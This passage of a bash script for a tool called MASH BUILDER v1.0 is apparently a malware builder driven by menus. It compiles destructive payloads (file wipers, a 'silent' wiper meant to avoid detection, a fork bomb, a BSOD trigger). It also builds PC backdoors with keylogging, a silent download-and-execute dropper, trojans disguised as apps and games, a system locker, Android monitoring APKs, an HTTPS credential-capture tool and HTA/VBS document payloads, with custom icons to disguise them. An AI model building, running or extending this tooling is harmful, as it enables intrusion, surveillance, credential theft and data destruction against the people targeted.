                echo -e "  ${GREEN}> Copied to drawable/images.png${NC}"
                
                ANYDPI_DIR="$RES_DIR/mipmap-anydpi-v26"
                if [ -d "$ANYDPI_DIR" ]; then
                    for xml_file in "$ANYDPI_DIR"/*.xml; do
                        [ -f "$xml_file" ] || continue
                        sed -i \
                            -e 's|@drawable/ic_launcher_background|@drawable/images|g' \
                            -e 's|@drawable/ic_launcher_foreground|@drawable/images|g' \
                            -e 's|@drawable/ic_launcher_monochrome|@drawable/images|g' \
                            "$xml_file"
                    done
                    echo -e "  ${GREEN}> Updated adaptive icon XMLs${NC}"
                fi
            else
                echo -e "${RED}[!] Image not found at: $IMG_PATH${NC}"
            fi
        fi
    fi
    echo ""
    
    # Build the project
    echo "==========================================="
    echo -e "${CYAN}[*] Building Project${NC}"
    echo "==========================================="
    
    cd "$project_dir" || handle_error "Failed to change to $project_dir"
    
    echo -e "  ${YELLOW}> Updating local.properties...${NC}"
    sed -i "s|/home/[^/]*/Android/Sdk|/home/$(whoami)/Android/Sdk|" local.properties
    
    echo -e "  ${YELLOW}> Making gradlew executable...${NC}"
    chmod +x gradlew
    
    echo -e "  ${YELLOW}> Cleaning project...${NC}"
    if ! run_with_spinner "./gradlew clean"; then
        handle_error "Gradle clean failed"
    fi
    
    echo -e "  ${YELLOW}> Building project...${NC}"
    if ! run_with_spinner "./gradlew build"; then
        handle_error "Gradle build failed"
    fi
    
    echo -e "  ${YELLOW}> Assembling debug APK...${NC}"
    if ! run_with_spinner "./gradlew assembleDebug"; then
        handle_error "Gradle assembleDebug failed"
    fi
    
    # Copy APK to output directory
    APK_PATH="$project_dir/app/build/outputs/apk/debug/app-debug.apk"
    
    if [ -f "$APK_PATH" ]; then
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)
        case $project_name in
            "Monitor") output_name="${ANDROID_MONITOR_NAME}_$TIMESTAMP.apk" ;;
            "Monitor2") output_name="${ANDROID_MONITOR2_NAME}_$TIMESTAMP.apk" ;;
            "Monitor3") output_name="${ANDROID_MONITOR3_NAME}_$TIMESTAMP.apk" ;;
            "Monitor4") output_name="${ANDROID_MONITOR4_NAME}_$TIMESTAMP.apk" ;;
            "HTTPSProxy") output_name="${ANDROID_HTTPS_PROXY_NAME}_$TIMESTAMP.apk" ;;
        esac
        
        mkdir -p "$OUTPUT_DIR"
        cp "$APK_PATH" "$OUTPUT_DIR/$output_name"
        echo ""
        echo "==========================================="
        echo -e "${GREEN}[+] Build complete!${NC}"
        echo -e "  ${GREEN}> APK copied to: $OUTPUT_DIR/$output_name${NC}"
        echo "==========================================="
    else
        echo ""
        echo -e "${RED}[!] Build failed or APK not found${NC}"
        handle_error "APK not found at $APK_PATH"
    fi
    
    # Wait for user input before continuing
    read -p "Press Enter to continue..."
}

# Function to build mash-bull payloads
build_mash_bull() {
    display_header
    echo -e "${GREEN}"
    print_mash_bull_ascii
    echo -e "${NC}"
    echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}Build annoying.exe${NC}    ${WHITE}- Creates annoying popups and windows${NC}         ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${YELLOW}Build wipe.exe${NC}        ${WHITE}- Deletes files from target system${NC}            ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}3.${NC} ${YELLOW}Build forkbomb.exe${NC}     ${WHITE}- Forks processes until system crashes${NC}       ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}4.${NC} ${YELLOW}Build silentwipe.exe${NC}   ${WHITE}- Silently deletes files without detection${NC}   ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}5.${NC} ${YELLOW}Build BSOD.exe${NC}         ${WHITE}- Triggers Blue Screen of Death on Windows${NC}   ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}      ${WHITE}- Return to the main menu${NC}                    ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Print prompt correctly
    echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
    printf "${BOLD_RED}└─>>${NC} "
    read choice

    case $choice in
        1|2|3|4|5)
            # For BSOD (choice 5), we force Windows
            if [ "$choice" -eq 5 ]; then
                platform="1"
            else
                echo "Select target platform:"
                echo "1) Windows"
                echo "2) Linux"
                echo -ne "${CYAN}Choose platform: ${NC}"
                read platform
            fi

            case $platform in
                1)
                    compiler="x86_64-w64-mingw32-gcc"
                    extension=".exe"
                    target="Windows"
                    ;;
                2)
                    if [ "$choice" -eq 5 ]; then
                        echo -e "${RED}BSOD is Windows-only! Building for Windows instead.${NC}"
                        compiler="x86_64-w64-mingw32-gcc"
                        extension=".exe"
                        target="Windows"
                    else
                        compiler="gcc"
                        extension=""
                        target="Linux"
                    fi
                    ;;
                *)
                    echo -e "${RED}Invalid platform selection. Building for Windows by default.${NC}"
                    compiler="x86_64-w64-mingw32-gcc"
                    extension=".exe"
                    target="Windows"
                    ;;
            esac

            # Change to BULL_DIR
            cd "$BULL_DIR" || handle_error "Failed to change to $BULL_DIR"

            case $choice in
                1)
                    source_file="annoying.c"
                    default_name="$BULL_ANNOYING_NAME"
                    ;;
                2)
                    source_file="wipe.c"
                    default_name="$BULL_WIPE_NAME"
                    ;;
                3)
                    source_file="forkbomb.c"
                    default_name="$BULL_FORKBOMB_NAME"
                    ;;
                4)
                    source_file="silentwipe.c"
                    default_name="$BULL_SILENTWIPE_NAME"
                    ;;
                5)
                    source_file="BSOD.c"
                    default_name="$BULL_BSOD_NAME"
                    ;;
            esac

            # Ask for custom name
            echo -ne "${CYAN}Enter output filename (default: $default_name):${NC} "
            read custom_name
            output_name="${custom_name:-$default_name}"
            
            # Add extension if not present
            if [ "$platform" = "1" ] && [[ "$output_name" != *".exe" ]]; then
                output_name="$output_name.exe"
            fi

            # Ask for custom icon
            echo -ne "${YELLOW}Add custom icon? (y/n) [default: n]:${NC} "
            read add_icon
            res_file=""
            
            if [[ "$add_icon" =~ ^[Yy]$ ]]; then
                if [ -n "$DEFAULT_ICON" ] && [ -f "$DEFAULT_ICON" ]; then
                    echo -e "${YELLOW}> Using default icon: $DEFAULT_ICON${NC}"
                    icon_path="$DEFAULT_ICON"
                else
                    echo -ne "${CYAN}Enter path to icon image:${NC} "
                    read icon_path
                fi
                
                if [ -f "$icon_path" ]; then
                    res_file=$(create_icon_resource "$icon_path")
                    if [ $? -ne 0 ]; then
                        res_file=""
                    fi
                else
                    echo -e "${RED}Icon file not found.${NC}"
                fi
            fi

            echo -e "${YELLOW}Building $output_name for $target...${NC}"
            
            # Build command
            build_cmd="$compiler -o $output_name $source_file"
            if [ -n "$res_file" ]; then
                build_cmd="$build_cmd $res_file"
            fi
            
            if run_with_spinner "$build_cmd"; then
                # Create output directory if it doesn't exist
                mkdir -p "$OUTPUT_DIR"
                cp -f "$output_name" "$OUTPUT_DIR/" || handle_error "Failed to copy output file"
                echo -e "${GREEN}Build complete! $output_name created for $target${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/$output_name${NC}"
            else
                handle_error "Build failed!"
            fi
            
            # Clean up temporary files
            if [ -n "$res_file" ]; then
                rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
            fi
            ;;
        0)
            main_menu
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            sleep 1
            build_mash_bull
            ;;
    esac

    read -p "Press Enter to continue..."
    build_mash_bull
}

# Function to configure global settings
mash_config() {
    while true; do
        display_header
        echo -e "${BOLD_PURPLE}"
        echo -e "${NC}"
        echo -e "${BOLD_GREEN}MASH BUILDER v1.0 - GLOBAL CONFIGURATION${NC}"
        echo ""
        echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}Set output directory${NC}           ${WHITE}- Change where built files are saved${NC} ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${YELLOW}Set default icon${NC}               ${WHITE}- Set default icon for all payloads${NC}  ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}3.${NC} ${YELLOW}Set BULL-DozzeR default names${NC}   ${WHITE}- Customize BULL payload names${NC}      ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}4.${NC} ${YELLOW}Set PC payload default names${NC}     ${WHITE}- Customize PC payload names${NC}       ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}5.${NC} ${YELLOW}Set Android payload default names${NC}${WHITE}- Customize Android payload names${NC}  ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}6.${NC} ${YELLOW}View current configuration${NC}      ${WHITE}- Display all current settings${NC}      ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}             ${WHITE}- Return to the main menu${NC}             ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
        
        # Print prompt correctly
        echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
        printf "${BOLD_RED}└─>>${NC} "
        read config_choice

        case $config_choice in
            1)
                echo -ne "${CYAN}Enter output directory (current: $OUTPUT_DIR):${NC} "
                read new_output_dir
                if [ -d "$new_output_dir" ]; then
                    OUTPUT_DIR="$new_output_dir"
                    echo -e "${GREEN}> Output directory set to: $OUTPUT_DIR${NC}"
                else
                    echo -e "${RED}> Directory does not exist: $new_output_dir${NC}"
                fi
                ;;
            2)
                echo -ne "${CYAN}Enter path to default icon (current: $DEFAULT_ICON):${NC} "
                read new_default_icon
                if [ -f "$new_default_icon" ]; then
                    DEFAULT_ICON="$new_default_icon"
                    echo -e "${GREEN}> Default icon set to: $DEFAULT_ICON${NC}"
                else
                    echo -e "${RED}> File does not exist: $new_default_icon${NC}"
                fi
                ;;
            3)
                echo -e "${CYAN}Set BULL-DozzeR default names:${NC}"
                echo -ne "  Annoying (current: $BULL_ANNOYING_NAME): "
                read new_annoying_name
                [ -n "$new_annoying_name" ] && BULL_ANNOYING_NAME="$new_annoying_name"
                
                echo -ne "  Wipe (current: $BULL_WIPE_NAME): "
                read new_wipe_name
                [ -n "$new_wipe_name" ] && BULL_WIPE_NAME="$new_wipe_name"
                
                echo -ne "  Forkbomb (current: $BULL_FORKBOMB_NAME): "
                read new_forkbomb_name
                [ -n "$new_forkbomb_name" ] && BULL_FORKBOMB_NAME="$new_forkbomb_name"
                
                echo -ne "  Silentwipe (current: $BULL_SILENTWIPE_NAME): "
                read new_silentwipe_name
                [ -n "$new_silentwipe_name" ] && BULL_SILENTWIPE_NAME="$new_silentwipe_name"
                
                echo -ne "  BSOD (current: $BULL_BSOD_NAME): "
                read new_bsod_name
                [ -n "$new_bsod_name" ] && BULL_BSOD_NAME="$new_bsod_name"
                
                echo -e "${GREEN}> BULL-DozzeR default names updated${NC}"
                ;;
            4)
                echo -e "${CYAN}Set PC payload default names:${NC}"
                echo -ne "  Interpreter (current: $PC_INTERPRETER_NAME): "
                read new_interpreter_name
                [ -n "$new_interpreter_name" ] && PC_INTERPRETER_NAME="$new_interpreter_name"
                
                echo -ne "  Hook (current: $PC_HOOK_NAME): "
                read new_hook_name
                [ -n "$new_hook_name" ] && PC_HOOK_NAME="$new_hook_name"
                
                echo -ne "  WebView (current: $PC_WEBVIEW_NAME): "
                read new_webview_name
                [ -n "$new_webview_name" ] && PC_WEBVIEW_NAME="$new_webview_name"
                
                echo -ne "  Downloader (current: $PC_DOWNLOADER_NAME): "
                read new_downloader_name
                [ -n "$new_downloader_name" ] && PC_DOWNLOADER_NAME="$new_downloader_name"
                
                echo -ne "  Java (current: $PC_JAVA_NAME): "
                read new_java_name
                [ -n "$new_java_name" ] && PC_JAVA_NAME="$new_java_name"
                
                echo -ne "  Java Game (current: $PC_JAVA_GAME_NAME): "
                read new_java_game_name
                [ -n "$new_java_game_name" ] && PC_JAVA_GAME_NAME="$new_java_game_name"
                
                echo -ne "  System Locker (current: $PC_LOCKER_NAME): "
                read new_locker_name
                [ -n "$new_locker_name" ] && PC_LOCKER_NAME="$new_locker_name"
                
                echo -e "${GREEN}> PC payload default names updated${NC}"
                ;;
5)
    echo -e "${CYAN}Set Android payload default names:${NC}"
    echo -ne "  Monitor (current: $ANDROID_MONITOR_NAME): "
    read new_monitor_name
    [ -n "$new_monitor_name" ] && ANDROID_MONITOR_NAME="$new_monitor_name"
    
    echo -ne "  Monitor2 (current: $ANDROID_MONITOR2_NAME): "
    read new_monitor2_name
    [ -n "$new_monitor2_name" ] && ANDROID_MONITOR2_NAME="$new_monitor2_name"
    
    echo -ne "  Monitor3 (current: $ANDROID_MONITOR3_NAME): "
    read new_monitor3_name
    [ -n "$new_monitor3_name" ] && ANDROID_MONITOR3_NAME="$new_monitor3_name"
    
    echo -ne "  Monitor4 (current: $ANDROID_MONITOR4_NAME): "
    read new_monitor4_name
    [ -n "$new_monitor4_name" ] && ANDROID_MONITOR4_NAME="$new_monitor4_name"
    
    echo -ne "  HTTPS Proxy (current: $ANDROID_HTTPS_PROXY_NAME): "
    read new_https_proxy_name
    [ -n "$new_https_proxy_name" ] && ANDROID_HTTPS_PROXY_NAME="$new_https_proxy_name"
    
    echo -e "${GREEN}> Android payload default names updated${NC}"
    ;;
            6)
                echo -e "${CYAN}Current configuration:${NC}"
                echo "  Output directory: $OUTPUT_DIR"
                echo "  Default icon: $DEFAULT_ICON"
                echo ""
                echo "  BULL-DozzeR default names:"
                echo "    Annoying: $BULL_ANNOYING_NAME"
                echo "    Wipe: $BULL_WIPE_NAME"
                echo "    Forkbomb: $BULL_FORKBOMB_NAME"
                echo "    Silentwipe: $BULL_SILENTWIPE_NAME"
                echo "    BSOD: $BULL_BSOD_NAME"
                echo ""
                echo "  PC payload default names:"
                echo "    Interpreter: $PC_INTERPRETER_NAME"
                echo "    Hook: $PC_HOOK_NAME"
                echo "    WebView: $PC_WEBVIEW_NAME"
                echo "    Downloader: $PC_DOWNLOADER_NAME"
                echo "    Java: $PC_JAVA_NAME"
                echo "    Java Game: $PC_JAVA_GAME_NAME"
                echo "    System Locker: $PC_LOCKER_NAME"
                echo ""
                echo "  Android payload default names:"
                echo "    Monitor: $ANDROID_MONITOR_NAME"
                echo "    Monitor2: $ANDROID_MONITOR2_NAME"
                echo "    Monitor3: $ANDROID_MONITOR3_NAME"
                echo "    HTTPS Proxy: $ANDROID_HTTPS_PROXY_NAME"
                ;;
            0)
                save_config
                break
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
        
        read -p "Press Enter to continue..."
    done
}

# Function to build mash-door -pc payloads
build_mash_door_pc() {
    display_header
    echo -e "${GREEN}"
    print_mash_door_pc_ascii
    echo -e "${NC}"
    echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}Interpreter Executor${NC} ${WHITE}- Execute commands remotely via interpreter${NC}    ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${YELLOW}C Payload${NC}             ${WHITE}- C-based backdoor with keylogging${NC}            ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}3.${NC} ${YELLOW}CPP Payload${NC}          ${WHITE}- C++ backdoor with webview functionality${NC}      ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}4.${NC} ${YELLOW}Silent Downloader${NC}    ${WHITE}- Download and execute files silently${NC}          ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}5.${NC} ${YELLOW}App Trojan${NC}           ${WHITE}- Disguised as legitimate application${NC}          ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}6.${NC} ${YELLOW}Java Payload${NC}          ${WHITE}- Cross-platform Java backdoor${NC}                ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}7.${NC} ${YELLOW}Java Game Payload${NC}    ${WHITE}- Disguised as a Java game${NC}                     ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}8.${NC} ${YELLOW}System Locker${NC}        ${WHITE}- Lock system with password protection${NC}         ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}    ${WHITE}- Return to the main menu${NC}                      ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Print prompt correctly
    echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
    printf "${BOLD_RED}└─>>${NC} "
    read choice

    case $choice in
        1) build_interpreter ;;
        2) build_c_payload ;;
        3) build_cpp_payload ;;
        4) build_silent_downloader ;;
        5) build_app_trojan ;;
        6) build_java_payload ;;
        7) build_java_game ;;
        8) build_system_locker ;;
        0) main_menu ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1; build_mash_door_pc ;;
    esac
}

# Function to build mash-door -android payloads
build_mash_door_android() {
    while true; do
        display_header
        echo -e "${GREEN}"
        print_mash_door_android_ascii
        echo -e "${NC}"
        echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}Monitor${NC}                   ${WHITE}- Full-featured Android monitoring tool${NC}   ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${YELLOW}Monitor2${NC}                  ${WHITE}- Enhanced Android monitoring with Kotlin${NC} ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}3.${NC} ${YELLOW}Monitor3${NC}                    ${WHITE}- Advanced Android monitoring features${NC}  ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}4.${NC} ${YELLOW}Monitor4${NC}                    ${WHITE}- Silent APK monitoring tool${NC}            ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}5.${NC} ${YELLOW}HTTPS Proxy${NC}                ${WHITE}- HTTPS traffic interception proxy${NC}       ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}6.${NC} ${YELLOW}Access Droid${NC}               ${WHITE}- Remote Android device access tool${NC}      ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}         ${WHITE}- Return to the main menu${NC}                 ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
        
        # Print prompt correctly
        echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
        printf "${BOLD_RED}└─>>${NC} "
        read choice

        case $choice in
            1) configure_android_project "Monitor" ;;
            2) configure_android_project "Monitor2" ;;
            3) configure_android_project "Monitor3" ;;
            4) configure_android_project "Monitor4" ;;
            5) configure_android_project "HTTPSProxy" ;;
            6) build_access_droid ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
    main_menu
}

# Function to build mash-cross payloads
build_mash_cross() {
    display_header
    echo -e "${GREEN}"
    print_mash_cross_ascii
    echo -e "${NC}"
    echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}HTTPS capture${NC}               ${WHITE}- Capture HTTPS traffic and credentials${NC} ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}             ${WHITE}- Return to the main menu${NC}             ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Print prompt correctly
    echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
    printf "${BOLD_RED}└─>>${NC} "
    read choice

    case $choice in
        1) build_https_capture ;;
        0) main_menu ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1; build_mash_cross ;;
    esac
}

# Function to build mash-doc payloads
build_mash_doc() {
    display_header
    echo -e "${GREEN}"
    print_mash_doc_ascii
    echo -e "${NC}"
    echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${YELLOW}HTA payload${NC}               ${WHITE}- HTML Application with embedded script${NC}   ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${YELLOW}VBS Payload${NC}               ${WHITE}- Visual Basic Script for Windows${NC}         ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}║${NC} ${RED}0.${NC} ${BOLD_RED}Back to main menu${NC}        ${WHITE}- Return to the main menu${NC}                  ${BOLD_GREEN}║${NC}"
    echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Print prompt correctly
    echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
    printf "${BOLD_RED}└─>>${NC} "
    read choice

    case $choice in
        1) build_hta_payload ;;
        2) build_vbs_payload ;;
        0) main_menu ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1; build_mash_doc ;;
    esac
}

# Function to open help file
mash_help() {
    if [ -f "$PC_DIR/README/readme.html" ]; then
        echo -e "${YELLOW}Opening help file...${NC}"
        xdg-open "$PC_DIR/README/readme.html" 2>/dev/null || open "$PC_DIR/README/readme.html" 2>/dev/null || echo -e "${RED}Could not open help file. Please open $PC_DIR/readme.html manually.${NC}"
    else
        echo -e "${RED}Help file not found at $PC_DIR/readme.html${NC}"
    fi
    read -p "Press Enter to continue..."
    main_menu
}

# Function for mash-server
mash_listener() {
    if [ -x "$BUILD" ]; then
        exec "$BUILD" "$@"
    else
        chmod +x "$BUILD"
        exec "$BUILD" "$@"
    fi
}

# Function for mash-fix (not implemented)
mash_fix() {
    echo -e "${YELLOW}mash-fix${NC}"
    echo -e "${RED}This feature is not yet implemented.${NC}"
    read -p "Press Enter to continue..."
    main_menu
}

# Function for mash-update (not implemented)
mash_update() {
    echo -e "${YELLOW}mash-update${NC}"
    echo -e "${RED}This feature is not yet implemented.${NC}"
    read -p "Press Enter to continue..."
    main_menu
}

# Function for mash-server
mash_server() {
    echo -e "${YELLOW}mash-server${NC}"
    echo -e "${RED}No server implements for 3 step set-up yet.${NC}"
    read -p "Press Enter to continue..."
    main_menu
}

# Function for mash-credits
mash_credits() {
    display_header
    echo -e "${BOLD_PURPLE}"
    echo -e "${NC}"
    echo -e "${BOLD_GREEN}MASH BUILDER v1.0 - CREDITS${NC}"
    echo ""
    echo -e "${CYAN}===============================================================${NC}"
    echo -e "${BOLD_GREEN}https://github.com/encryptedgreen${NC} ${BOLD_YELLOW}|${NC} ${NC}Complete tool development and implementation${NC}"
    echo -e "${CYAN}===============================================================${NC}"
    echo ""
    echo -e "${YELLOW}VERSION 1.0 FEATURES:${NC}"
    echo -e "${CYAN}---------------------------------------------------------------${NC}"
    echo -e "${YELLOW}mash-bull${NC}           | ${NC}Destructive payload builder (annoying, wipe, forkbomb, etc.)${NC}"
    echo -e "${YELLOW}mash-door -pc${NC}       | ${NC}PC backdoor generator (C/C++, Java, Interpreter)${NC}"
    echo -e "${YELLOW}mash-door -android${NC}  | ${NC}Android backdoor generator (Monitor, HTTPS Proxy)${NC}"
    echo -e "${YELLOW}mash-cross${NC}          | ${NC}Cross-platform tools (HTTPS capture)${NC}"
    echo -e "${YELLOW}mash-doc${NC}            | ${NC}Document payload generator (HTA, VBS)${NC}"
    echo -e "${YELLOW}CLI Interface${NC}       | ${NC}Complete command-line interface with ASCII art${NC}"
    echo -e "${YELLOW}Configuration System${NC}| ${NC}Customizable payload configuration${NC}"
    echo -e "${YELLOW}Multi-platform${NC}      | ${NC}Cross-compilation support for Linux and Windows${NC}"
    echo -e "${CYAN}---------------------------------------------------------------${NC}"
    echo ""
    echo -e "${BOLD_BLUE}Thank you for using MASH BUILDER v1.0!${NC}"
    echo ""
    read -p "Press Enter to continue..."
    main_menu
}

# Main menu function
main_menu() {
    while true; do
        display_header
        echo -e "${GREEN}"
        print_main_menu_ascii
        echo -e "${NC}"
        echo -e "${BOLD_GREEN}╔════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}1.${NC} ${BOLD_GREEN}mash-bull${NC}        ${YELLOW}- Build destructive payloads${NC}                       ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}2.${NC} ${BOLD_GREEN}mash-door -pc${NC}    ${YELLOW}- Build PC backdoors${NC}                               ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}3.${NC} ${BOLD_GREEN}mash-door -android${NC} ${YELLOW}- Build Android backdoors${NC}                        ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}4.${NC} ${BOLD_GREEN}mash-cross${NC}      ${YELLOW}- Build cross-platform tools${NC}                        ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}5.${NC} ${BOLD_GREEN}mash-doc${NC}         ${YELLOW}- Build document payloads${NC}                          ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}6.${NC} ${BOLD_GREEN}mash-config${NC}      ${YELLOW}- Configure global settings${NC}                        ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}7.${NC} ${BOLD_GREEN}mash-help${NC}        ${YELLOW}- Show help documentation${NC}                          ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}8.${NC} ${BOLD_GREEN}mash-listener${NC}      ${YELLOW}- Jump to listener${NC}                               ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}9.${NC} ${BOLD_GREEN}mash-fix${NC}         ${YELLOW}- Fix common issues${NC}                                ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}10.${NC} ${BOLD_GREEN}mash-update${NC}      ${YELLOW}- Update the tool${NC}                                 ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}0.${NC} ${BOLD_GREEN}mash-cloud${NC}     ${YELLOW}- Set up a server${NC}                                    ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}c.${NC} ${BOLD_BLUE}mash-credits${NC}     ${YELLOW}- View credits${NC}                                     ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${CYAN}d.${NC} ${BOLD_BLUE}Toggle debug${NC}     ${YELLOW}- Debug mode: $DEBUG${NC}                                ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}║${NC} ${RED}e.${NC} ${RED}Exit${NC}             ${YELLOW}- Exit the program${NC}                                 ${BOLD_GREEN}║${NC}"
        echo -e "${BOLD_GREEN}╚════════════════════════════════════════════════════════════════════════╝${NC}"
        
        # Print prompt correctly
        echo -e "${BOLD_RED}┌──(${BOLD_GREEN}MOD${BOLD_RED}[${BOLD_GREEN}~$CURRENT_DIR${BOLD_RED}])${NC}"
        printf "${BOLD_RED}└─>>${NC} "
        read choice

        case $choice in
            1) build_mash_bull ;;
            2) build_mash_door_pc ;;
            3) build_mash_door_android ;;
            4) build_mash_cross ;;
            5) build_mash_doc ;;
            6) mash_config ;;
            7) mash_help ;;
            8) mash_listener ;;
            9) mash_fix ;;
            10) mash_update ;;
            0) mash_server ;;
            c) mash_credits ;;
            d) DEBUG=!DEBUG ;;
            e) exit 0 ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Payload building functions
build_interpreter() {
    echo -e "${YELLOW}Building Interpreter Executor...${NC}"
    cd "$PC_DIR/interpretor"
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    echo "HOST: $(grep -oP 'const\s+char\*\s+HOST\s*=\s*"\K[^"]+' client.cpp)"
    echo "PORT: $(grep -oP 'const\s+int\s+PORT\s*=\s*\K[0-9]+' client.cpp)"
    
    # Get new variables
    if [ -n "$SERVER_IP" ]; then
        new_host="$SERVER_IP"
        echo -e "${GREEN}> Using command-line HOST: $new_host${NC}"
    else
